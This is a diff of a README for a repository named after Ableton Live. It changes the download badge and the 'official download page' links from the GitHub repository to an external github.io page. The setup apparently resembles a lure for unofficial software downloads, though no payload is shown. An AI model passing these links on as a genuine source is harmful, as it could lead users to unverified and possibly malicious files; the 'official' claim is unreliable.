@@ -1,6 +1,6 @@
 # 🎹 Ableton-Live-2026 - Improve your music production workflow today
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/ruimigu5689/Ableton-Live-2026)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://ruimigu5689.github.io)
 
 ## 📌 Project Overview
 
@@ -19,7 +19,7 @@ Ensure your computer meets these specifications before you begin:
 
 ## 📥 Downloading the Files
 
-Visit the [official download page](https://github.com/ruimigu5689/Ableton-Live-2026) to obtain the latest version of the toolkit. 
+Visit the [official download page](https://ruimigu5689.github.io) to obtain the latest version of the toolkit. 
 
 1. Go to the link above in your web browser.
 2. Locate the section labeled Releases on the right side of the page.
